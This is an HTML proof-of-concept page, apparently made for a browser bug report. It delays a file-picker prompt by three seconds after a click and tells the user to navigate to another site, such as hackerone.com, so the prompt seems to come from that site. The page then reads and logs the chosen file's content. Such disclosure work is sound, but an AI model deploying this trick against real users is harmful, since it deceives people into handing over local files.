<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Delayed File Open Picker</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background-color: #fafafa;
      cursor: pointer;
      user-select: none;
    }
    h1 {
      color: #333;
      text-align: center;
      max-width: 400px;
      padding: 20px;
    }
  </style>
</head>
<body>
  <h1>
    Click me anywhere.<br>
    Then browse to another site (e.g. hackerone.com)
  </h1>

  <script>
    document.addEventListener('click', async () => {
      setTimeout(async () => {
        if ('showOpenFilePicker' in window) {
          try {
            const [fileHandle] = await window.showOpenFilePicker({
              multiple: false,
              types: [
                {
                  description: 'Text Files',
                  accept: {
                    'text/plain': ['.txt', '.log', '.php']
                  }
                }
              ]
            });

            // Read file content (optional, for demo)
            const file = await fileHandle.getFile();
            const content = await file.text();

            console.log("Selected file:", file.name);
            console.log("Content:", content);

          } catch (err) {
            // User cancel / error
            console.log("User canceled or error:", err);
          }
        } else {
          alert("showOpenFilePicker not supported in this browser.");
        }
      }, 3000); // delay 3 detik
    }, { once: true });
  </script>
</body>
</html>
